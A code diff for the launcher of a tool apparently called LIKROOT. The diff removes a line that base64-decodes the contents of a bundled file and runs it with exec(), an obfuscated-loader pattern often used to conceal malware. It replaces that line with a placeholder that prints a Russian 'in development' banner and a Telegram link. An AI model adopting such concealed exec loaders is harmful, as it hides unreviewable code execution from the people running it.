@@ -1,1 +1,35 @@
-import base64, functools; exec(functools.reduce(lambda current_bytes, _: base64.b64decode(current_bytes), range(1), open('data/system_code/start', "r", encoding='utf-8').read().encode('utf-8')).decode('utf-8'))
+import os
+import platform
+
+
+
+if platform.system() == "Windows": 
+    os.system("title [+] LIKROOT")
+    st = "python LIKROOT.py"
+    dl = "cls"
+    os.system("cls")
+else:
+    dl = "clear"
+    st = "python3 LIKROOT.py"
+    os.system("clear")
+
+
+logo = """
+
+╔╗──╔══╦╗╔═╦═══╦═══╦═══╦════╗
+║║──╚╣╠╣║║╔╣╔═╗║╔═╗║╔═╗║╔╗╔╗║
+║║───║║║╚╝╝║╚═╝║║─║║║─║╠╝║║╚╝
+║║─╔╗║║║╔╗║║╔╗╔╣║─║║║─║║─║║
+║╚═╝╠╣╠╣║║╚╣║║╚╣╚═╝║╚═╝║─║║
+╚═══╩══╩╝╚═╩╝╚═╩═══╩═══╝─╚╝
+
+🙃На данный момент софт в разработке
+🔶Developer: RESHETKA
+💬Telegramm: https://t.me/+SUsx6idsYCphNzAy
+
+
+"""
+
+print(logo)
+input("Нажмите Enter")
+exit()
